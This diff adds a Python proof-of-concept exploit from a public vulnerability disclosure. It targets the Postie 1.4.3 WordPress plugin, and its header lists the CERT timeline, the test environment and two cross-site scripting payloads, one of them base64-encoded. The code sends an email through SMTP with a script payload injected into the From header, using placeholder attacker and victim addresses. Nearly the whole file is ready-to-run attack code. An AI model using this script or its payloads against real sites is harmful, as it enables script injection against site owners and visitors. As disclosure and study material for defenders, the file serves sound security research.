@@ -1,0 +1,56 @@
+#!/usr/bin/python
+
+'''
+
+Author: loneferret of Offensive Security
+Product: Postie
+Version: 1.4.3
+Software Download: http://wordpress.org/extend/plugins/postie/
+
+Timeline:
+29 May 2012: Vulnerability reported to CERT
+30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
+23 Jul 2012: Update received from CERT. Vendor was advised to contact researcher. No other contact received.
+08 Aug 2012: Public Disclosure
+
+Installed On: Ubuntu Server LAMP 8.04
+Wordpress: 3.3.1
+Client Test OS: MAC OS Lion
+Browser Used: Firefox 12
+
+Injection Point: From
+Injection Payload(s):
+1: <BODY ONLOAD=alert('XSS')> 
+2: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+'''
+
+
+import smtplib, urllib2
+  
+payload = """<BODY ONLOAD=alert('XSS')>"""
+  
+def sendMail(dstemail, frmemail, smtpsrv, username, password):
+        msg  = "From: hacker@offsec.local" + payload + "\n"
+        msg += "To: victim@victim.local\n"
+        msg += 'Date: Today\r\n'
+        msg += "Subject: Offensive Security\n"
+        msg += "Content-type: text/html\n\n"
+        msg += "XSS\r\n\r\n"
+        server = smtplib.SMTP(smtpsrv)
+        server.login(username,password)
+        try:
+                server.sendmail(frmemail, dstemail, msg)
+        except Exception, e:
+                print "[-] Failed to send email:"
+                print "[*] " + str(e)
+        server.quit()
+  
+username = "hacker@offsec.local"
+password = "123456"
+dstemail = "victim@victim.local"
+frmemail = "hacker@offsec.local"
+smtpsrv  = "172.16.84.171"
+  
+print "[*] Sending Email"
+sendMail(dstemail, frmemail, smtpsrv, username, password)
